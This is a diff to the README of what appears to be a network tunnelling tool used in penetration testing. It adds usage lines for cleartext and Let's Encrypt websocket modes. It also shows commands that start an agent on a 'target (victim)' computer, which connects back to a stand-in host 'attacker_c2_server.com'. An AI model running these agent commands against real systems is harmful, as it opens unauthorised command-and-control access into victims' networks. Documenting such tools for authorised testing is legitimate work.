@@ -115,9 +115,15 @@ $ ./proxy -autocert # Automatically request LetsEncrypt certificates
 ```
 
 ### TLS Options
+#### Disabling TLS encription and using cleartext websockets (for debug purpuses)
+```shell
+$ ./proxy -laddr http://0.0.0.0:8080  # use cleartext http websocket
+```
 
 #### Using Let's Encrypt Autocert
-
+```shell
+$ ./proxy -autocert -laddr https://0.0.0.0:443  # use https websocet + autocert
+```
 When using the `-autocert` option, the proxy will automatically request a certificate (using Let's Encrypt) for *attacker_c2_server.com* when an agent connects.
 
 > Port 80 needs to be accessible for Let's Encrypt certificate validation/retrieval
@@ -172,7 +178,7 @@ Start the *agent* on your target (victim) computer (no privileges are required!)
 $ ./agent -connect attacker_c2_server.com:11601
 ```
 
-Or you can start the *agent* on your target (victim) computer and connect via websocket:
+Or you can start the *agent* on your target (victim) computer and connect via websocket (http or https):
 
 ```shell
 $ ./agent -connect https://attacker_c2_server.com:8443
